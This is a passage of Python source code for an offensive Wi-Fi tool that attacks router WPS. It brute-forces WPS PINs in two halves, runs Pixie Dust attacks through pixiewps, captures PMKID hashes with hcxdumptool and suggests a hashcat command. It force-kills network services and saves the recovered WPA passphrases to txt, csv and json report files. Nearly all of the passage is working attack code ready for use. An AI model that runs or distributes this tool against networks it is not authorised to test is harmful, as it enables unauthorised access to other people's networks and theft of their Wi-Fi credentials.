            return
        print(f'{C.B_CYAN}[*]{C.RESET} {C.B_WHITE}{percentage:.2f}%{C.RESET} '
              f'complete @ {C.GOLD}{self.start_time}{C.RESET} '
              f'({C.YELLOW}{average_pin_time:.2f}s/pin{C.RESET})')

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self):
        self.__init__()


# ═══════════════════════════════════════════════════════════════════
#  COMPANION
# ═══════════════════════════════════════════════════════════════════
class Companion:
    def __init__(self, interface, save_result=False, print_debug=False, bssid=''):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug
        self.bssid = bssid
        self.lastPwr = 0
        self.bruteforce = None
        self.loop_mode = False
        self._fail_count = 0
        self._watchdog_stop = None
        self._killed_processes = []

        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'
                       .format(self.tempdir))
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.__init_wpa_supplicant()

        self.res_socket_file = (f"{tempfile._get_default_tempdir()}/"
                                f"{next(tempfile._get_candidate_names())}")
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        user_home = str(pathlib.Path.home())
        self.sessions_dir = f'{user_home}/.Noyon/sessions/'
        self.pixiewps_dir = f'{user_home}/.Noyon/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        for d in (self.sessions_dir, self.pixiewps_dir, self.reports_dir):
            os.makedirs(d, exist_ok=True)

        self.generator = WPSpin()
        self._start_watchdog()

    def __init_wpa_supplicant(self, max_retries=3):
        for attempt in range(1, max_retries + 1):
            try:
                print(f'{C.B_CYAN}[*]{C.RESET} {C.WHITE}Starting wpa_supplicant… '
                      f'(attempt {attempt}/{max_retries}){C.RESET}')
                cmd = ('wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired '
                       '-i{} -c{}').format(self.interface, self.tempconf)
                self.wpas = subprocess.Popen(
                    cmd, shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    encoding='utf-8', errors='replace')

                timeout = 10
                start = time.time()
                while time.time() - start < timeout:
                    ret = self.wpas.poll()
                    if ret is not None and ret != 0:
                        raise ValueError(f'wpa_supplicant exited with code {ret}')
                    if os.path.exists(self.wpas_ctrl_path):
                        return
                    time.sleep(0.1)

                self.wpas.terminate()
                try:
                    self.wpas.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    self.wpas.kill()
                raise TimeoutError('ctrl_interface timeout')
            except Exception as e:
                if attempt >= max_retries:
                    raise RuntimeError(
                        f'Failed to start wpa_supplicant after {max_retries} '
                        f'attempts: {e}')
                print(f'{C.B_YELLOW}[!]{C.RESET} Attempt {attempt} failed: {e}')
                print(f'{C.B_YELLOW}[!]{C.RESET} Retrying in 2s…')
                time.sleep(2)

    def _start_watchdog(self):
        self._watchdog_stop = threading.Event()

        def _monitor():
            while not self._watchdog_stop.is_set():
                try:
                    if hasattr(self, 'wpas') and self.wpas is not None:
                        ret = self.wpas.poll()
                        if ret is not None and ret != 0:
                            print(f'{C.B_RED}[!]{C.RESET} wpa_supplicant died, restarting…')
                            try:
                                self.__init_wpa_supplicant()
                            except Exception as e:
                                print(f'{C.B_RED}[!]{C.RESET} Restart failed: {e}')
                except Exception:
                    pass
                time.sleep(5)

        self._watchdog_thread = threading.Thread(target=_monitor, daemon=True)
        self._watchdog_thread.start()

    def sendOnly(self, command):
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command, timeout=30):
        try:
            self.retsock.settimeout(timeout)
            self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
            (b, _) = self.retsock.recvfrom(4096)
            return b.decode('utf-8', errors='replace')
        except socket.timeout:
            return 'TIMEOUT'
        except Exception as e:
            return f'ERROR: {e}'
        finally:
            try:
                self.retsock.settimeout(None)
            except Exception:
                pass

    @staticmethod
    def _explain_wpas_not_ok_status(command, respond):
        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return (f'{C.B_RED}[!]{C.RESET} wpa_supplicant appears to be '
                        f'compiled without WPS protocol support. '
                        f'Rebuild with CONFIG_WPS=y')
        return f'{C.B_RED}[!]{C.RESET} Something went wrong — check out the debug log'

    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None, bssid=''):
        if not verbose:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                print(f'{C.B_CYAN}[*]{C.RESET} Sending WPS Message '
                      f'{C.B_WHITE}M{n}{C.RESET}…')
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                print(f'{C.B_CYAN}[*]{C.RESET} Received WPS Message '
                      f'{C.B_WHITE}M{n}{C.RESET}')
                if n == 5:
                    print(f'{C.B_GREEN}[+]{C.RESET} The first half of the PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                print(f'{C.B_YELLOW}[*]{C.RESET} Received WSC NACK')
                print(f'{C.B_RED}[-]{C.RESET} Error: wrong PIN code')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                if pixiemode:
                    print(f'{C.B_MAGENTA}[P]{C.RESET} E-Nonce: {C.GOLD}{self.pixie_creds.e_nonce}{C.RESET}')
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                if pixiemode:
                    print(f'{C.B_MAGENTA}[P]{C.RESET} PKR: {C.GOLD}{self.pixie_creds.pkr}{C.RESET}')
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                if pixiemode:
                    print(f'{C.B_MAGENTA}[P]{C.RESET} PKE: {C.GOLD}{self.pixie_creds.pke}{C.RESET}')
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                if pixiemode:
                    print(f'{C.B_MAGENTA}[P]{C.RESET} AuthKey: {C.GOLD}{self.pixie_creds.authkey}{C.RESET}')
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                if pixiemode:
                    print(f'{C.B_MAGENTA}[P]{C.RESET} E-Hash1: {C.GOLD}{self.pixie_creds.e_hash1}{C.RESET}')
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                if pixiemode:
                    print(f'{C.B_MAGENTA}[P]{C.RESET} E-Hash2: {C.GOLD}{self.pixie_creds.e_hash2}{C.RESET}')
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = (
                    bytes.fromhex(get_hex(line))
                    .decode('utf-8', errors='replace'))
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                print(f'{C.B_CYAN}[*]{C.RESET} Scanning…')
        elif 'WPS-FAIL' in line and self.connection_status.status:
            self.connection_status.status = 'WPS_FAIL'
            print(f'{C.B_RED}[-]{C.RESET} wpa_supplicant returned WPS-FAIL')
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = self.__decode_ssid(line)
            print(f'{C.B_CYAN}[*]{C.RESET} Authenticating…')
        elif 'Authentication response' in line:
            print(f'{C.B_GREEN}[+]{C.RESET} Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = self.__decode_ssid(line)
            print(f'{C.B_CYAN}[*]{C.RESET} Associating with AP…')
        elif 'Associated with' in line and self.interface in line:
            bssid_target = line.split()[-1].upper()
            if self.connection_status.essid:
                print(f'{C.B_GREEN}[+]{C.RESET} Associated with '
                      f'{C.B_WHITE}{bssid_target}{C.RESET} '
                      f'(ESSID: {C.GOLD}{self.connection_status.essid}{C.RESET})')
            else:
                print(f'{C.B_GREEN}[+]{C.RESET} Associated with '
                      f'{C.B_WHITE}{bssid_target}{C.RESET}')
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            print(f'{C.B_CYAN}[*]{C.RESET} Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            print(f'{C.B_CYAN}[*]{C.RESET} Received Identity Request')
        elif 'using real identity' in line:
            print(f'{C.B_CYAN}[*]{C.RESET} Sending Identity Response…')
        elif bssid and bssid in line and 'level=' in line:
            signal = line.split("level=")[1].split(" ")[0]
            self.lastPwr = signal
            if verbose:
                if 'noise=' in line:
                    noise = line.split("noise=")[1].split(" ")[0]
                    print(f'{C.DIM}[i] Current signal: {signal}, noise: {noise}{C.RESET}')
                else:
                    print(f'{C.DIM}[i] Current signal: {signal}{C.RESET}')
        elif pbc_mode and ('selected BSS ' in line):
            bssid_target = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = bssid_target
            print(f'{C.B_CYAN}[*]{C.RESET} Selected AP: {C.B_WHITE}{bssid_target}{C.RESET}')
        return True

    @staticmethod
    def __decode_ssid(line):
        try:
            return (codecs.decode("'".join(line.split("'")[1:-1]),
                                  'unicode-escape')
                    .encode('latin1').decode('utf-8', errors='replace'))
        except Exception:
            return ''

    def __runPixiewps(self, showcmd=False, full_range=False):
        print(f'{C.B_CYAN}[*]{C.RESET} Running Pixiewps…')
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd:
            print(f'{C.DIM}{cmd}{C.RESET}')
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                           stderr=sys.stdout, encoding='utf-8', errors='replace')
        print(r.stdout)
        if r.returncode == 0:
            for line in r.stdout.splitlines():
                if '[+]' in line and 'WPS pin' in line:
                    pin = line.split(':')[-1].strip().strip("'")
                    return "''" if pin == '<empty>' else pin
        return False

    def pmkid_attack(self, bssid, timeout=60):
        if not _OPTIONAL_TOOLS.get('hcxdumptool', False):
            print(f'{C.B_YELLOW}[!]{C.RESET} hcxdumptool not available '
                  f'— PMKID attack skipped')
            return None

        print(f'{C.B_CYAN}[*]{C.RESET} Starting PMKID capture on {bssid}…')
        print(f'{C.DIM}[i] This may take up to {timeout}s…{C.RESET}')

        pcap = f'/tmp/pmkid_{bssid.replace(":", "")}.pcapng'
        cmd = (f'timeout {timeout} hcxdumptool -i {self.interface} '
               f'-o {pcap} --filterlist_ap={bssid} --filtermode=2 '
               f'--enable_status=1')

        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL)

        if not os.path.exists(pcap) or os.path.getsize(pcap) == 0:
            print(f'{C.B_RED}[-]{C.RESET} No PMKID captured')
            return None

        hash_file = pcap.replace('.pcapng', '.16800')
        if _OPTIONAL_TOOLS.get('hcxpcapngtool', False):
            subprocess.run(f'hcxpcapngtool -o {hash_file} {pcap}',
                           shell=True, stdout=subprocess.DEVNULL)
            if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                print(f'{C.B_GREEN}[+]{C.RESET} PMKID captured! '
                      f'Saved to {C.GOLD}{hash_file}{C.RESET}')
                if _OPTIONAL_TOOLS.get('hashcat', False):
                    print(f'{C.B_CYAN}[i]{C.RESET} Crack with: '
                          f'hashcat -m 16800 {hash_file} wordlist.txt')
                return hash_file

        print(f'{C.B_YELLOW}[!]{C.RESET} PMKID may not be present '
              f'(file: {pcap})')
        return pcap

    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        print()
        print(f'{C.B_GREEN}╔══════════════════════════════════════════════════════╗{C.RESET}')
        print(f'{C.B_GREEN}║{C.RESET}  {C.B_YELLOW}★ CREDENTIALS CAPTURED ★{C.RESET}                            {C.B_GREEN}║{C.RESET}')
        print(f'{C.B_GREEN}╠══════════════════════════════════════════════════════╣{C.RESET}')
        print(f'{C.B_GREEN}║{C.RESET}  {C.BOLD}WPS PIN {C.RESET}: {C.B_GREEN}{wps_pin}{C.RESET}')
        print(f'{C.B_GREEN}║{C.RESET}  {C.BOLD}WPA PSK {C.RESET}: {C.B_GREEN}{wpa_psk}{C.RESET}')
        print(f'{C.B_GREEN}║{C.RESET}  {C.BOLD}AP SSID {C.RESET}: {C.B_GREEN}{essid}{C.RESET}')
        print(f'{C.B_GREEN}╚══════════════════════════════════════════════════════╝{C.RESET}')
        print()

    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        os.makedirs(self.reports_dir, exist_ok=True)
        filename = self.reports_dir + 'stored'
        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")

        with open(filename + '.txt', 'a', encoding='utf-8') as f:
            f.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'
                    .format(dateStr, bssid, essid, wps_pin, wpa_psk))

        write_header = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as f:
            w = csv.writer(f, delimiter=';', quoting=csv.QUOTE_ALL)
            if write_header:
                w.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            w.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])

        json_file = filename + '.json'
        data = []
        if os.path.exists(json_file):
            try:
                with open(json_file, 'r', encoding='utf-8') as jf:
                    data = json.load(jf)
                if not isinstance(data, list):
                    data = []
            except Exception:
                shutil.copy2(json_file, json_file + '.bak')
                data = []
        data.append({'date': dateStr, 'bssid': bssid, 'essid': essid,
                     'wps_pin': wps_pin, 'wpa_psk': wpa_psk})
        with open(json_file, 'w', encoding='utf-8') as jf:
            json.dump(data, jf, indent=4)

        print(f'{C.B_CYAN}[i]{C.RESET} Credentials saved to '
              f'{C.GOLD}{filename}.txt{C.RESET}, '
              f'{C.GOLD}{filename}.csv{C.RESET}, and '
              f'{C.GOLD}{filename}.json{C.RESET}')

    def __savePin(self, bssid, pin):
        filename = self.pixiewps_dir + '{}.run'.format(
            bssid.replace(':', '').upper())
        with open(filename, 'w') as f:
            f.write(pin)
        print(f'{C.B_CYAN}[i]{C.RESET} PIN saved in {C.GOLD}{filename}{C.RESET}')

    def __prompt_wpspin(self, bssid):
        pins = self.generator.getSuggested(bssid)
        if len(pins) > 1:
            print()
            print(f'{C.B_CYAN}╭─ {C.B_WHITE}PINs generated for {bssid}{C.RESET}')
            print(f'{C.B_CYAN}│{C.RESET}')
            print(f'{C.B_CYAN}│{C.RESET}  {C.BOLD}{"#":<5}{"PIN":<12}{"Name"}{C.RESET}')
            print(f'{C.B_CYAN}│{C.RESET}  {C.DIM}{"─"*45}{C.RESET}')
            for i, pin in enumerate(pins):
                num = f'{i + 1})'
                print(f'{C.B_CYAN}│{C.RESET}  {C.B_RED}{num:<5}{C.RESET}'
                      f'{C.B_GREEN}{pin["pin"]:<12}{C.RESET}{pin["name"]}')
            print(f'{C.B_CYAN}╰─────────────────────────────────────────{C.RESET}')
            while True:
                pinNo = input(f'{C.B_CYAN}└─▶{C.RESET} Select the PIN: ')
                try:
                    if int(pinNo) in range(1, len(pins) + 1):
                        return pins[int(pinNo) - 1]['pin']
                except Exception:
                    pass
                print(f'{C.B_RED}[!]{C.RESET} Invalid number')
        elif len(pins) == 1:
            print(f'{C.B_CYAN}[i]{C.RESET} The only probable PIN is selected: '
                  f'{C.GOLD}{pins[0]["name"]}{C.RESET}')
            return pins[0]['pin']
        return None

    def __wps_connection(self, bssid=None, pin=None, pixiemode=False,
                         pbc_mode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()

        try:
            os.set_blocking(self.wpas.stdout.fileno(), False)
            while self.wpas.stdout.read(1024):
                pass
            os.set_blocking(self.wpas.stdout.fileno(), True)
        except Exception:
            pass

        if pbc_mode:
            if bssid:
                print(f'{C.B_CYAN}[*]{C.RESET} Starting WPS push button connection to '
                      f'{C.B_WHITE}{bssid}{C.RESET}…')
                cmd = f'WPS_PBC {bssid}'
            else:
                print(f'{C.B_CYAN}[*]{C.RESET} Starting WPS push button connection…')
                cmd = 'WPS_PBC'
        else:
            print(f'{C.B_CYAN}[*]{C.RESET} Trying PIN {C.B_GREEN}{pin}{C.RESET}…')
            cmd = f'WPS_REG {bssid} {pin}'

        r = self.sendAndReceive(cmd)
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            print(self._explain_wpas_not_ok_status(cmd, r))
            return False

        while True:
            res = self.__handle_wpas(
                pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose,
                bssid=bssid.lower() if bssid else '')
            if not res:
                break
            if self.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                break

        self.sendOnly('WPS_CANCEL')

        if self.connection_status.status == 'WPS_FAIL':
            self._fail_count += 1
            if self._fail_count >= 5:
                print()
                print(f'{C.B_RED}╔══════════════════════════════════════════════════════╗{C.RESET}')
                print(f'{C.B_RED}║{C.RESET}  {C.B_YELLOW}⚠  WARNING: WPS may be LOCKED!{C.RESET}                     {C.B_RED}║{C.RESET}')
                print(f'{C.B_RED}║{C.RESET}  After 5 failed attempts, most routers lock    {C.B_RED}║{C.RESET}')
                print(f'{C.B_RED}║{C.RESET}  WPS for 1 hour or permanently.                {C.B_RED}║{C.RESET}')
                print(f'{C.B_RED}╚══════════════════════════════════════════════════════╝{C.RESET}')
                confirm = input(f'{C.B_YELLOW}[?]{C.RESET} Continue anyway? [y/N]: ')
                if confirm.lower() != 'y':
                    return False
                self._fail_count = 0
        else:
            self._fail_count = 0

        return False

    def single_connection(self, bssid=None, pin=None, pixiemode=False,
                          pbc_mode=False, showpixiecmd=False, pixieforce=False,
                          store_pin_on_fail=False, null_pin=False):
        if null_pin:
            pin = '00000000'
        if not pin:
            if pixiemode:
                try:
                    filename = self.pixiewps_dir + '{}.run'.format(
                        bssid.replace(':', '').upper())
                    with open(filename, 'r') as f:
                        t_pin = f.readline().strip()
                    if input(f'{C.B_YELLOW}[?]{C.RESET} Use previously calculated PIN '
                             f'{C.B_GREEN}{t_pin}{C.RESET}? [n/Y] ').lower() != 'n':
                        pin = t_pin
                    else:
                        raise FileNotFoundError
                except FileNotFoundError:
                    pin = self.generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:
                pin = self.__prompt_wpspin(bssid) or '12345670'

        if pbc_mode:
            self.__wps_connection(bssid, pbc_mode=pbc_mode)
            bssid = self.connection_status.bssid
            pin = '<PBC mode>'
        elif store_pin_on_fail:
            try:
                self.__wps_connection(bssid, pin, pixiemode)
            except KeyboardInterrupt:
                print(f'\n{C.B_YELLOW}Aborting…{C.RESET}')
                self.__savePin(bssid, pin)
                return False
        else:
            self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'GOT_PSK':
            self.__credentialPrint(pin, self.connection_status.wpa_psk,
                                   self.connection_status.essid)
            if self.save_result:
                self.__saveResult(bssid, self.connection_status.essid,
                                  pin, self.connection_status.wpa_psk)
            if not pbc_mode:
                try:
                    os.remove(self.pixiewps_dir + '{}.run'.format(
                        bssid.replace(':', '').upper()))
                except FileNotFoundError:
                    pass
            return True
        elif pixiemode:
            if self.pixie_creds.got_all():
                pin = self.__runPixiewps(showpixiecmd, pixieforce)
                if pin:
                    return self.single_connection(bssid, pin, pixiemode=False,
                                                  store_pin_on_fail=True)
                return False
            print(f'{C.B_RED}[!]{C.RESET} Not enough data to run Pixie Dust attack')
            return False
        else:
            if store_pin_on_fail:
                self.__savePin(bssid, pin)
            return False

    def __first_half_bruteforce(self, bssid, f_half, delay=None):
        checksum = self.generator.checksum
        while int(f_half) < 10000:
            t = int(f_half + '000')
            pin = '{}000{}'.format(f_half, checksum(t))
            self.single_connection(bssid, pin)
            if self.connection_status.isFirstHalfValid():
                print(f'{C.B_GREEN}[+]{C.RESET} First half found')
                return f_half
            elif self.connection_status.status == 'WPS_FAIL':
                print(f'{C.B_YELLOW}[!]{C.RESET} WPS transaction failed, re-trying last pin')
                return self.__first_half_bruteforce(bssid, f_half)
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half)
            if delay:
                time.sleep(delay)
        print(f'{C.B_RED}[-]{C.RESET} First half not found')
        return False

    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
        checksum = self.generator.checksum
        while int(s_half) < 1000:
            t = int(f_half + s_half)
            pin = '{}{}{}'.format(f_half, s_half, checksum(t))
            self.single_connection(bssid, pin)
            if self.connection_status.last_m_message > 6:
                return pin
            elif self.connection_status.status == 'WPS_FAIL':
                print(f'{C.B_YELLOW}[!]{C.RESET} WPS transaction failed, re-trying last pin')
                return self.__second_half_bruteforce(bssid, f_half, s_half)
            s_half = str(int(s_half) + 1).zfill(3)
            self.bruteforce.registerAttempt(f_half + s_half)
            if delay:
                time.sleep(delay)
        return False

    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
        if (not start_pin) or (len(start_pin) < 4):
            try:
                filename = self.sessions_dir + '{}.run'.format(
                    bssid.replace(':', '').upper())
                with open(filename, 'r') as f:
                    if input(f'{C.B_YELLOW}[?]{C.RESET} Restore previous session for '
                             f'{C.B_WHITE}{bssid}{C.RESET}? [n/Y] ').lower() != 'n':
                        mask = f.readline().strip()
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]

        try:
            self.bruteforce = BruteforceStatus()
            self.bruteforce.mask = mask
            if len(mask) == 4:
                f_half = self.__first_half_bruteforce(bssid, mask, delay)
                if f_half and self.connection_status.status != 'GOT_PSK':
                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
            elif len(mask) == 7:
                self.__second_half_bruteforce(bssid, mask[:4], mask[4:], delay)
            raise KeyboardInterrupt
        except KeyboardInterrupt:
            print(f'\n{C.B_YELLOW}Aborting…{C.RESET}')
            filename = self.sessions_dir + '{}.run'.format(
                bssid.replace(':', '').upper())
            with open(filename, 'w') as f:
                f.write(self.bruteforce.mask)
            print(f'{C.B_CYAN}[i]{C.RESET} Session saved in {C.GOLD}{filename}{C.RESET}')
            if self.loop_mode:
                raise

    # ── Fix #3: systemd-aware kill/restore ──
    def kill_interfering_processes(self):
        interferers = ['NetworkManager', 'dhclient', 'dhcpcd']
        for proc in interferers:
            try:
                # Detect if it's a systemd service
                is_service = False
                try:
                    is_service = subprocess.run(
                        ['systemctl', 'is-active', '--quiet', f'{proc}.service'],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                        timeout=3
                    ).returncode == 0
                except (FileNotFoundError, subprocess.TimeoutExpired):
                    is_service = False

                result = subprocess.run(['pgrep', '-x', proc],
                                        capture_output=True, text=True,
                                        timeout=5)
                if result.returncode == 0:
                    pids = [p for p in result.stdout.strip().split('\n')
                            if p.strip()]
                    for pid in pids:
                        subprocess.run(['kill', '-9', pid],
                                       stdout=subprocess.DEVNULL,
                                       stderr=subprocess.DEVNULL)
                    self._killed_processes.append({
                        'name': proc,
                        'service': is_service,
                        'pids': pids,
                    })
                    print(f'{C.B_YELLOW}[!]{C.RESET} Killed {proc} '
                          f'(PID: {", ".join(pids)})'
                          + ('  [systemd service]' if is_service else ''))
            except Exception as e:
                print(f'{C.B_YELLOW}[!]{C.RESET} Kill {proc} failed: {e}')

    def restore_processes(self):
        if not self._killed_processes:
            return
        print(f'{C.B_CYAN}[*]{C.RESET} Restoring killed processes…')
        for entry in self._killed_processes:
            name = entry['name']
            try:
                if entry['service']:
                    rc = subprocess.run(
                        ['systemctl', 'start', f'{name}.service'],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                        timeout=10
                    ).returncode
                    if rc == 0:
                        print(f'{C.B_GREEN}[+]{C.RESET} Restarted '
                              f'{name} via systemctl')
                    else:
                        print(f'{C.B_YELLOW}[!]{C.RESET} systemctl could not '
                              f'start {name} — run manually: '
                              f'sudo systemctl start {name}')
                else:
                    if shutil.which(name):
                        subprocess.Popen(
                            [name],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            start_new_session=True)
                        print(f'{C.B_GREEN}[+]{C.RESET} Restarted {name} binary')
                    else:
                        print(f'{C.B_YELLOW}[!]{C.RESET} {name} binary not '
                              f'found — restore skipped')
            except Exception as e:
                print(f'{C.B_YELLOW}[!]{C.RESET} Restore {name} failed: {e}')
        self._killed_processes.clear()

    def cleanup(self):
        try:
            if self._watchdog_stop is not None:
                self._watchdog_stop.set()
        except Exception:
            pass

        try:
            if hasattr(self, 'retsock') and self.retsock:
                self.retsock.close()
        except Exception:
            pass

        try:
            if hasattr(self, 'wpas') and self.wpas:
                self.wpas.terminate()
                try:
                    self.wpas.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    self.wpas.kill()
        except Exception:
            pass

        for p in (getattr(self, 'res_socket_file', None),
                  getattr(self, 'tempconf', None)):
            if p:
                try:
                    os.remove(p)
                except Exception:
                    pass

        try:
            if hasattr(self, 'tempdir'):
                shutil.rmtree(self.tempdir, ignore_errors=True)
        except Exception:
            pass

    def __del__(self):
        try:
            self.cleanup()
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════════
#  WIFI SCANNER — REAL-TIME WPS ON/OFF DETECTION
# ═══════════════════════════════════════════════════════════════════
class WiFiScanner:
    LINE_WIDTH = 48

    def __init__(self, interface, vuln_list=None, reverse_scan=False):
        self.interface = interface
        self.vuln_list = vuln_list
        self.reverse_scan = reverse_scan

        reports_fname = (os.path.dirname(os.path.realpath(__file__))
                         + '/reports/stored.csv')
        try:
            with open(reports_fname, 'r', newline='', encoding='utf-8',
                      errors='replace') as f:
                csvReader = csv.reader(f, delimiter=';', quoting=csv.QUOTE_ALL)
                next(csvReader)
                self.stored = [(row[1], row[2]) for row in csvReader]
        except FileNotFoundError:
            self.stored = []

    def iw_scanner(self) -> Dict[int, dict]:
        def handle_network(line, result, networks):
            networks.append({'Security type': 'Unknown', 'WPS': False,
                             'WPS locked': False, 'WPS state': 0,
                             'Model': '', 'Model number': '', 'Device name': '',
                             'BSSID': result.group(1).upper()})

        def handle_essid(line, result, networks):
            networks[-1]['ESSID'] = self._decode(result.group(1))

        def handle_level(line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handle_securityType(line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                sec = 'WEP' if 'Privacy' in result.group(2) else 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN':
                    sec = 'WPA2'
                elif result.group(1) == 'WPA':
                    sec = 'WPA'
            elif sec == 'WPA':
                if result.group(1) == 'RSN':
                    sec = 'WPA/WPA2'
            elif sec == 'WPA2':
                if result.group(1) == 'WPA':
                    sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handle_wps(line, result, networks):
            networks[-1]['WPS'] = result.group(1)

        def handle_wpsState(line, result, networks):
            try:
                networks[-1]['WPS state'] = int(result.group(1))
            except ValueError:
                networks[-1]['WPS state'] = 0

        def handle_wpsLocked(line, result, networks):
            if int(result.group(1), 16):
                networks[-1]['WPS locked'] = True

        def handle_model(line, result, networks):
            networks[-1]['Model'] = self._decode(result.group(1))

        def handle_modelNumber(line, result, networks):
            networks[-1]['Model number'] = self._decode(result.group(1))

        def handle_deviceName(line, result, networks):
            networks[-1]['Device name'] = self._decode(result.group(1))

        cmd = f'iw dev {self.interface} scan'
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, encoding='utf-8',
                              errors='replace')
        if proc.returncode != 0:
            print(f'{C.B_RED}[!]{C.RESET} iw scan failed:',
                  (proc.stdout or '').splitlines()[:1])
            return False

        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
            re.compile(r'SSID: (.*)'): handle_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
            re.compile(r'(capability): (.+)'): handle_securityType,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
            re.compile(r' [*] Wi-Fi Protected Setup State: (\d+)'): handle_wpsState,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
            re.compile(r' [*] Model: (.*)'): handle_model,
            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
            re.compile(r' [*] Device name: (.*)'): handle_deviceName,
        }

        for line in proc.stdout.splitlines():
            if line.startswith('command failed:'):
                print(f'{C.B_RED}[!]{C.RESET} Error:', line)
                return False
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)

        if not networks:
            return False

        # ── Fix #5: track total BEFORE filtering ──
        total_scanned = len(networks)

        # ── FILTER: শুধু WPS ON নেটওয়ার্ক দেখাবে ──
        networks = [n for n in networks if n['WPS']]
        if not networks:
            print(f'{C.B_YELLOW}[!]{C.RESET} No WPS-enabled networks found '
                  f'(scanned {total_scanned} total).')
            return False

        networks.sort(key=lambda n: n['Level'], reverse=True)
        network_list = {(i + 1): n for i, n in enumerate(networks)}

